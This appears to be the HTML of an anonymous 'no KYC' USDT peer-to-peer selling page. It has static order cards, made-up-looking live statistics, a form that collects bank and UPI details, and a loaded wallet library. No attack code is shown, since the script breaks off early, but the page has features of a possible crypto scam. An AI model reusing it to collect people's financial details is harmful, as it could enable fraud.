<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RelianceTrade - USDT Orders</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gradient-bg {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .card-hover {
            transition: all 0.3s ease;
        }
        .card-hover:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
        }
        .order-card {
            transition: all 0.3s ease;
        }
        .order-card:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        .buy-order {
            border-left: 4px solid #10b981;
        }
        .sell-order {
            border-left: 4px solid #ef4444;
        }
        .status-online {
            background: #10b981;
        }
        .status-offline {
            background: #6b7280;
        }
        .animate-pulse {
            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: .5; }
        }
        .spinner {
            color: #fff;
            font-weight: bold;
        }
    </style>
</head>
<body class="bg-gray-50">
    <!-- Navigation -->
    <nav class="bg-white shadow-lg fixed w-full z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center py-4" style="display:none;">
                <div class="flex items-center">
                    <i class="fas fa-coins text-2xl text-blue-600 mr-2"></i>
                    <span class="text-xl font-bold text-gray-800">RelianceTrade</span>
                </div>
                <div class="hidden md:flex space-x-8">
                    <a href="index.html" class="text-gray-600 hover:text-blue-600 transition-colors">Home</a>
                    <a href="orders.html" class="text-blue-600 font-semibold">Orders</a>
                    <a href="#" class="text-gray-600 hover:text-blue-600 transition-colors">How it Works</a>
                    <a href="#" class="text-gray-600 hover:text-blue-600 transition-colors">Contact</a>
                </div>
                <div class="flex space-x-4">
                    <button class="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors">
                        Create Order
                    </button>
                    <button class="md:hidden" id="mobile-menu-btn">
                        <i class="fas fa-bars text-gray-600"></i>
                    </button>
                </div>
            </div>
        </div>
        <!-- Mobile Menu -->
        <div class="md:hidden hidden" id="mobile-menu">
            <div class="px-2 pt-2 pb-3 space-y-1 bg-white border-t">
                <a href="index.html" class="block px-3 py-2 text-gray-600 hover:text-blue-600">Home</a>
                <a href="orders.html" class="block px-3 py-2 text-blue-600 font-semibold">Orders</a>
                <a href="#" class="block px-3 py-2 text-gray-600 hover:text-blue-600">How it Works</a>
                <a href="#" class="block px-3 py-2 text-gray-600 hover:text-blue-600">Contact</a>
            </div>
        </div>
    </nav>

    <!-- Header Section -->
    <section class="gradient-bg text-white pt-24 pb-8">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="text-center">
                <h1 class="text-3xl md:text-4xl font-bold mb-4">
                    RelianceTrade USDT Sell Orders
                </h1>
                <p class="text-xl text-blue-100 max-w-2xl mx-auto">
                    Browse USDT selling orders from verified users on RelianceTrade. No registration required, completely anonymous.
                </p>
            </div>
        </div>
    </section>

    <!-- Filters and Stats -->
    <section class="bg-white py-6 border-b">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
                <!-- Stats -->
                <div class="flex space-x-6 text-sm">
                    <div class="flex items-center">
                        <i class="fas fa-chart-line text-green-500 mr-2"></i>
                        <span class="text-gray-600">Live Price: <span class="font-semibold text-green-600">₹110/USDT</span></span>
                    </div>
                    <div class="flex items-center">
                        <i class="fas fa-users text-blue-500 mr-2"></i>
                        <span class="text-gray-600">Active Traders: <span class="font-semibold">247</span></span>
                    </div>
                    <div class="flex items-center">
                        <i class="fas fa-clock text-yellow-500 mr-2"></i>
                        <span class="text-gray-600">Last Update: <span class="font-semibold">2 min ago</span></span>
                    </div>
                </div>
                
                <!-- Filters -->
                <div class="flex flex-wrap gap-3">
                    <select id="order-type-filter" class="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent">
                        <option value="all">All Orders</option>
                        <option value="sell">Sell Orders</option>
                    </select>
                    <select id="payment-filter" class="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent">
                        <option value="all">All Payment Methods</option>
                        <option value="UPI">UPI</option>
                        <option value="IMPS">IMPS</option>
                        <option value="Bank Transfer">Bank Transfer</option>
                        <option value="Paytm">Paytm</option>
                        <option value="PhonePe">PhonePe</option>
                        <option value="Google Pay">Google Pay</option>
                    </select>
                    <select id="amount-filter" class="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent">
                        <option value="all">Any Amount</option>
                        <option value="1000-10000">₹1,000 - ₹10,000</option>
                        <option value="10000-50000">₹10,000 - ₹50,000</option>
                        <option value="50000-100000">₹50,000 - ₹1,00,000</option>
                        <option value="100000+">₹1,00,000+</option>
                    </select>
                    <button id="filter-btn" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors">
                        <i class="fas fa-filter mr-2"></i>Filter
                    </button>
                    <button id="clear-filters" class="px-4 py-2 bg-gray-500 text-white rounded-lg hover:bg-gray-600 transition-colors">
                        <i class="fas fa-times mr-2"></i>Clear
                    </button>
                </div>
            </div>
        </div>
    </section>

    <!-- Orders Grid -->
    <section class="py-8">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <!-- Sell Orders Section -->
            <div class="mb-8">
                <h2 class="text-2xl font-bold text-gray-800 mb-6 flex items-center">
                    <i class="fas fa-arrow-down text-red-500 mr-3"></i>
                    Sell USDT Orders
                    <span class="ml-2 text-sm text-gray-500">(41 orders)</span>
                </h2>
                <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
                    <!-- Sell Order Card 1 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by USDT_Seller</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹110/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹30,000 - ₹2,50,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">UPI,IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">96%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 2 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="IMPS" data-amount="15000-180000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by CryptoExchange</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹112/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹15,000 - ₹1,80,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">94%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 3 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="Google Pay" data-amount="50000-500000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by USDT_Dealer</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹108/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹50,000 - ₹5,00,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">Google Pay,IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">89%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 4 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="IMPS" data-amount="100000-1000000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by CryptoMaster</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹115/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹1,00,000 - ₹10,00,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">97%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 5 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="Paytm" data-amount="20000-200000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by USDT_Pro</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-offline mr-2"></div>
                                <span class="text-xs text-gray-500">Offline</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹105/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹20,000 - ₹2,00,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">Paytm</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">91%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-gray-400 text-white py-2 rounded-lg cursor-not-allowed" disabled>
                                Offline
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 6 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="PhonePe" data-amount="5000-50000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by FastTrader</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹110/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹5,000 - ₹50,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">PhonePe,IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">93%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Additional Orders (Hidden by default) -->
                <div id="additional-orders" class="hidden grid md:grid-cols-2 lg:grid-cols-3 gap-6 mt-8">
                    <!-- Sell Order Card 7 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="25000-300000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by CryptoKing</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹113/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹25,000 - ₹3,00,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">UPI,IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">95%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 8 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="Paytm,IMPS" data-amount="10000-100000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by USDT_Elite</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹109/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹10,000 - ₹1,00,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">Paytm,IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">88%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 9 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="5000-50000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by FastCash</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹111/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹5,000 - ₹50,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">UPI,IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">92%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 10 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="Bank Transfer,IMPS" data-amount="50000-500000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by CryptoTrader</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-offline mr-2"></div>
                                <span class="text-xs text-gray-500">Offline</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹107/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹50,000 - ₹5,00,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">Bank Transfer,IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">90%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-gray-400 text-white py-2 rounded-lg cursor-not-allowed" disabled>
                                Offline
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 11 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="100000-1000000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by USDT_Pro</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹114/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹1,00,000 - ₹10,00,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">UPI,IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">98%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Sell Order Card 12 -->
                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="Google Pay,IMPS" data-amount="15000-200000" data-type="sell">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
                                <p class="text-sm text-gray-500">by CryptoMaster</p>
                            </div>
                            <div class="flex items-center">
                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
                                <span class="text-xs text-gray-500">Online</span>
                            </div>
                        </div>
                        <div class="space-y-3 mb-4">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹110/USDT</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Amount:</span>
                                <span class="font-semibold">₹15,000 - ₹2,00,000</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Payment:</span>
                                <span class="font-semibold">Google Pay,IMPS</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Completion:</span>
                                <span class="font-semibold text-green-600">94%</span>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <button class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                                Sell Now
                            </button>
                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
                                <i class="fas fa-comments"></i>
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Load More Button -->
            <div class="text-center">
                <button id="load-more-btn" class="px-8 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors">
                    <i class="fas fa-sync-alt mr-2"></i>
                    Load More Orders (6 of 41)
                </button>
            </div>
        </div>
    </section>

    <!-- Notification Toast -->
    <div id="notification-toast" class="fixed top-4 right-4 z-60 hidden">
        <div class="bg-white rounded-lg shadow-lg p-4 max-w-sm">
            <div class="flex items-center">
                <div id="toast-icon" class="mr-3">
                    <i class="fas fa-info-circle text-blue-500 text-xl"></i>
                </div>
                <div class="flex-1">
                    <h4 id="toast-title" class="font-semibold text-gray-800">Notification</h4>
                    <p id="toast-message" class="text-sm text-gray-600">This is a notification message.</p>
                </div>
                <button id="toast-close" class="text-gray-400 hover:text-gray-600">
                    <i class="fas fa-times"></i>
                </button>
            </div>
        </div>
    </div>

    <!-- Quick Trade Modal -->
    <div id="trade-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden z-50">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-lg shadow-xl max-w-md w-full">
                <div class="flex justify-between items-center p-6 border-b">
                    <h3 class="text-lg font-semibold text-gray-800">Sell USDT</h3>
                    <button id="close-modal" class="text-gray-400 hover:text-gray-600">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="p-6">
                    <div class="mb-4">
                        <label class="block text-sm font-medium text-gray-700 mb-2">USDT Amount</label>
                        <input type="number" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter USDT amount">
                    </div>
                    <div class="mb-4">
                        <label class="block text-sm font-medium text-gray-700 mb-2">Payment Method</label>
                        <select id="payment-method" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent">
                            <option value="">Select Payment Method</option>
                            <option value="UPI">UPI</option>
                            <option value="IMPS">IMPS</option>
                            <option value="Bank Transfer">Bank Transfer</option>
                            <option value="Paytm">Paytm</option>
                            <option value="PhonePe">PhonePe</option>
                            <option value="Google Pay">Google Pay</option>
                        </select>
                    </div>
                    
                    <!-- Payment Details Section -->
                    <div id="payment-details" class="mb-4 hidden">
                        <h4 class="text-sm font-medium text-gray-700 mb-3">Payment Details</h4>
                        
                        <!-- UPI Details -->
                        <div id="upi-details" class="payment-form hidden">
                            <div class="mb-3">
                                <label class="block text-sm font-medium text-gray-600 mb-1">UPI ID</label>
                                <input type="text" id="upi-id" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter your UPI ID">
                            </div>
                        </div>
                        
                        <!-- Bank Transfer Details -->
                        <div id="bank-details" class="payment-form hidden">
                            <div class="mb-3">
                                <label class="block text-sm font-medium text-gray-600 mb-1">Account Holder Name</label>
                                <input type="text" id="holder-name" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter account holder name">
                            </div>
                            <div class="mb-3">
                                <label class="block text-sm font-medium text-gray-600 mb-1">Account Number</label>
                                <input type="text" id="account-number" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter account number">
                            </div>
                            <div class="mb-3">
                                <label class="block text-sm font-medium text-gray-600 mb-1">IFSC Code</label>
                                <input type="text" id="ifsc-code" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter IFSC code">
                            </div>
                        </div>
                        
                        <!-- Digital Wallet Details -->
                        <div id="digital-wallet-details" class="payment-form hidden">
                            <div class="mb-3">
                                <label class="block text-sm font-medium text-gray-600 mb-1">Mobile Number</label>
                                <input type="text" id="mobile-number" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter your mobile number">
                            </div>
                        </div>
                    </div>
                    <div class="mb-6">
                        <div class="bg-gray-50 p-3 rounded-lg">
                            <div class="flex justify-between text-sm">
                                <span class="text-gray-600">You will receive:</span>
                                <span class="font-semibold" id="inr-amount">₹0.00</span>
                            </div>
                            <div class="flex justify-between text-sm mt-1">
                                <span class="text-gray-600">Price:</span>
                                <span class="font-semibold text-red-600">₹110/USDT</span>
                            </div>
                        </div>
                    </div>
                    <div class="flex space-x-3">
                        <button id="sell-usdt-btn" class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
                            <span id="sell-btn-text">Proceed with Trade</span>
                            <span id="sell-btn-loading" class="hidden">
                                <i class="fas fa-spinner fa-spin mr-2"></i>Processing...
                            </span>
                        </button>
                        <button id="cancel-trade" class="flex-1 bg-gray-200 text-gray-700 py-2 rounded-lg hover:bg-gray-300 transition-colors">
                            Cancel
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-gray-800 text-white py-8">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="text-center">
                <div class="flex items-center justify-center mb-4">
                    <i class="fas fa-coins text-2xl text-blue-400 mr-2"></i>
                    <span class="text-xl font-bold">USDT P2P</span>
                </div>
                <p class="text-gray-400 mb-4">
                    The most private and anonymous P2P USDT trading platform. No signup, no KYC, no fees.
                </p>
                <div class="flex justify-center space-x-4">
                    <a href="#" class="text-gray-400 hover:text-white transition-colors">
                        <i class="fab fa-twitter text-xl"></i>
                    </a>
                    <a href="#" class="text-gray-400 hover:text-white transition-colors">
                        <i class="fab fa-telegram text-xl"></i>
                    </a>
                    <a href="#" class="text-gray-400 hover:text-white transition-colors">
                        <i class="fab fa-discord text-xl"></i>
                    </a>
                </div>
            </div>
        </div>
    </footer>
<script>
    // ===== NOTIFICATION BAR SETUP =====
    function showNotification(msg, type = "info") {
        let notify = document.getElementById("notify-bar");
        if (!notify) {
            notify = document.createElement("div");
            notify.id = "notify-bar";
            notify.style.position = "fixed";
            notify.style.top = "20px";
            notify.style.left = "50%";
            notify.style.transform = "translateX(-50%)";
            notify.style.zIndex = "9999";
            notify.style.minWidth = "260px";
            notify.style.maxWidth = "90vw";
            notify.style.padding = "16px 32px";
            notify.style.borderRadius = "12px";
            notify.style.fontSize = "1rem";
            notify.style.fontWeight = "bold";
            notify.style.textAlign = "center";
            notify.style.boxShadow = "0 4px 32px #0008";
            notify.style.transition = "all 0.3s";
            document.body.appendChild(notify);
        }
        notify.textContent = msg;
        notify.style.background = type === "error" ? "#f87171" : (type === "success" ? "#10b981" : "#374151");
